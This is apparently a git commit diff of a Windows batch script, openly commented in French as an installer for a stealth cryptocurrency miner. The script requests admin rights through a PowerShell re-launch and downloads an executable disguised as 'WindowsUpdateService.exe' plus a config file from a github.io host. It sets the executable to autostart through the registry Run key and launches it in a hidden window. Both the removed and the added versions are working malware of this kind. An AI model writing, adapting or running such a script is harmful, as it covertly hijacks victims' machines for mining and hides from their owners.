e59f37a4b545f04eef85a5ffe128061d216b16fa
Outof-ctrl <Mister.N0_N4M3@proton.me>
2025-01-27 01:23:46 +0100

    Update install_WindowsUpdateService.bat

--- install_WindowsUpdateService.bat
+++ install_WindowsUpdateService.bat
@@ -1,50 +1,52 @@
 @echo off
-:: Définir les variables
-setlocal enabledelayedexpansion
-set miner_url=https://outof-ctrl.github.io/Outof-repo/WindowsUpdateService.exe
-set config_url=https://outof-ctrl.github.io/Outof-repo/config.json
-set target_dir=%APPDATA%\WinUS
-set log_file=%TEMP%\miner_install_log.txt
+:: ===============================
+:: Script d'installation pour mineur furtif
+:: ===============================
 
-:: Vérifier les droits administratifs
+:: Vérifie les droits administratifs
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo [ERREUR] Ce script nécessite des droits administratifs. Relancement... >> %log_file%
-    powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb runAs"
-    exit
+    echo [ERREUR] Ce script nécessite des droits administratifs. Relancement...
+    powershell -Command "Start-Process -FilePath '%~0' -Verb RunAs"
+    exit /b
 )
 
-:: Créer le répertoire cible
-if not exist "%target_dir%" (
-    mkdir "%target_dir%"
-    echo [INFO] Répertoire %target_dir% créé. >> %log_file%
+:: Variables
+set LOGFILE=%TEMP%\miner_install_log.txt
+set MINER_URL=https://outof-ctrl.github.io/Outof-repo/WindowsUpdateService.exe
+set CONFIG_URL=https://outof-ctrl.github.io/Outof-repo/config.json
+set MINER_PATH=%APPDATA%\WinUS
+set MINER_EXEC=WindowsUpdateService.exe
+set MINER_CONFIG=config.json
+
+:: Journalisation
+echo [INFO] Début de l'installation > "%LOGFILE%"
+echo [INFO] Vérification des droits administratifs... >> "%LOGFILE%"
+
+:: Crée le répertoire de destination
+if not exist "%MINER_PATH%" (
+    mkdir "%MINER_PATH%"
+    echo [INFO] Répertoire %MINER_PATH% créé. >> "%LOGFILE%"
+) else (
+    echo [INFO] Répertoire %MINER_PATH% existe déjà. >> "%LOGFILE%"
 )
 
-:: Télécharger le mineur et le fichier de configuration
-echo [INFO] Téléchargement du mineur... >> %log_file%
-curl -o "%target_dir%\WindowsUpdateService.exe" %miner_url%
-if %errorlevel% neq 0 (
-    echo [ERREUR] Échec du téléchargement du mineur. >> %log_file%
-    exit
-)
-echo [INFO] Téléchargement du fichier de configuration... >> %log_file%
-curl -o "%target_dir%\config.json" %config_url%
-if %errorlevel% neq 0 (
-    echo [ERREUR] Échec du téléchargement du fichier de configuration. >> %log_file%
-    exit
-)
+:: Télécharge le mineur furtif
+echo [INFO] Téléchargement du mineur... >> "%LOGFILE%"
+curl -o "%MINER_PATH%\%MINER_EXEC%" %MINER_URL% >> "%LOGFILE%" 2>&1
 
-:: Ajouter au démarrage
-echo [INFO] Ajout du mineur au démarrage... >> %log_file%
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /d "%target_dir%\WindowsUpdateService.exe --config %target_dir%\config.json" /f
-if %errorlevel% neq 0 (
-    echo [ERREUR] Impossible d'ajouter au démarrage. >> %log_file%
-    exit
-)
+:: Télécharge le fichier de configuration
+echo [INFO] Téléchargement du fichier de configuration... >> "%LOGFILE%"
+curl -o "%MINER_PATH%\%MINER_CONFIG%" %CONFIG_URL% >> "%LOGFILE%" 2>&1
 
-:: Lancer le mineur
-echo [INFO] Lancement du mineur... >> %log_file%
-start "" "%target_dir%\WindowsUpdateService.exe" --config "%target_dir%\config.json"
+:: Ajoute le mineur au démarrage via le registre
+echo [INFO] Ajout du mineur au démarrage... >> "%LOGFILE%"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%MINER_PATH%\%MINER_EXEC%\" --config %MINER_PATH%\%MINER_CONFIG%" /f >> "%LOGFILE%" 2>&1
 
-echo [SUCCES] Installation terminée. >> %log_file%
-exit
+:: Lancement furtif du mineur
+echo [INFO] Lancement du mineur en mode furtif... >> "%LOGFILE%"
+powershell -WindowStyle Hidden -Command "Start-Process '%MINER_PATH%\%MINER_EXEC%' -ArgumentList '--config %MINER_PATH%\%MINER_CONFIG%' -WindowStyle Hidden" >> "%LOGFILE%" 2>&1
+
+:: Fin
+echo [SUCCES] Installation terminée. >> "%LOGFILE%"
+exit /b
